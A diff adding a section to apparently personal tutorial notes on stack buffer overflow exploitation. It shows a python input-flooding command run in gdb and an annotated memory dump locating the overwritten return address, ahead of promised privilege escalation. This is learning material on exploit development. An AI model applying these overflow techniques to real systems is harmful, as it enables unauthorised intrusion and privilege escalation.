@@ -12,6 +12,41 @@ This would be an example of shellcode using python so you don't have to spam inp
 run $(python -c "print('A'*158)")
 this does it inside of gdb debugger!
 
+When you are overwriting the buffer to start off with, ensure you overwrite the whole buffer so you can see the return address. It can be a bit funky, but the one
+that worked for me this time was x/100x $rsp-200 
+If you don't overwrite the whole buffer, you wont see this.
+
+Here is a nice example:
+Program received signal SIGSEGV, Segmentation fault.
+0x0000414141414141 in ?? ()
+(gdb) x/100x $rsp-200
+0x7fffffffe218: 0x004005a9      0x00000000      0xf7ffa268      0x00007fff
+0x7fffffffe228: 0xffffe63a      0x00007fff      0x67676f64      0x4141416f
+0x7fffffffe238: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe248: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe258: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe268: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe278: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe288: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe298: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2a8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2b8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2c8: 0x41414141      0x41414141      0x41414141      0x41414141 <-- Our As that we flooded this with
+0x7fffffffe2d8: 0x41414141      0x00004141      0xffffe3d8      0x00007fff <-- This 0x7fff is our return address.
+0x7fffffffe2e8: 0x00000000      0x00000002      0x004005e0      0x00000000
+0x7fffffffe2f8: 0xf7a4d13a      0x00007fff      0x00000000      0x00000000
+0x7fffffffe308: 0xffffe3d8      0x00007fff      0x00040000      0x00000002
+0x7fffffffe318: 0x004005ac      0x00000000      0x00000000      0x00000000
+0x7fffffffe328: 0xd9ddbebf      0xef3130f5      0x00400450      0x00000000
+0x7fffffffe338: 0xffffe3d0      0x00007fff      0x00000000      0x00000000
+0x7fffffffe348: 0x00000000      0x00000000      0x141dbebf      0x10cecf8a
+0x7fffffffe358: 0x73f9bebf      0x10cedf3c      0x00000000      0x00000000
+0x7fffffffe368: 0x00000000      0x00000000      0x00000000      0x00000000
+0x7fffffffe378: 0xffffe3f0      0x00007fff      0xf7ffe130      0x00007fff 
+0x7fffffffe388: 0xf7de7fe6      0x00007fff      0x00000000      0x00000000
+0x7fffffffe398: 0x00000000      0x00000000      0x00000000      0x00000000
+
+
 
 But how do we know that we've overwrote it successfully?
 let's do some more digging:
@@ -74,4 +109,5 @@ A final thing, its normally a LOT of trial and error. If you get illegal instruc
 You will need to go through a fair few. It's just life unfortunately.
 
 Next up, im gonna write about doings things to the binary in order to give us admin!
+
 
